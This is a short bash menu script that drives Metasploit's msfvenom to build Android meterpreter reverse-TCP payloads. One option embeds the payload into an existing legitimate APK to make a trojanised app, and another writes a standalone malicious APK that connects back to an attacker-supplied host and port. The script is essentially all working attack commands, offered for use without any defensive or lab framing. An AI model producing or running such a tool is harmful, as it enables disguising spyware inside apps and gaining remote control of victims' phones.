echo "----------------------------------"
echo "      SCRIPT BY SATHVIK K S       "
echo " PLEASE MAKE SURE THAT THE CURRENT "
echo " PATH CONTAINS METASPLOIT FRAMEWOTK"
echo "----------------------------------"
echo "Select option"
echo "1. Embed Payload"
echo "2. Create Payload"
echo "3. Launch msfconsole"
echo "4. Exit"
read -p ">|" o
if [ $o = "3" ]
then
msfconsole
break
elif [ $o = "1" ]
then
echo "Enter HOST"
read -p ">|" host
echo "Enter PORT"
read -p ">|" port
echo "Please enter the complete path with .apk extension that you want to embed with"
read -p ">|" p1
echo "Please enter the complete path with .apk extension where you want to save the embedded apk to"
read -p ">|" p4
msfvenom -x $p1 -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $p4
elif [ $o = "2" ]
then
echo "Enter HOST"
read -p ">|" host1
echo "Enter PORT"
read -p ">|" port1
echo "Please enter the complete path with .apk extension"
echo "where you want to save the payload to"
read -p ">|" p2
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
elif [ $o = "4" ]
then
exit
else
echo "Wrong choice. Please try again"
fi
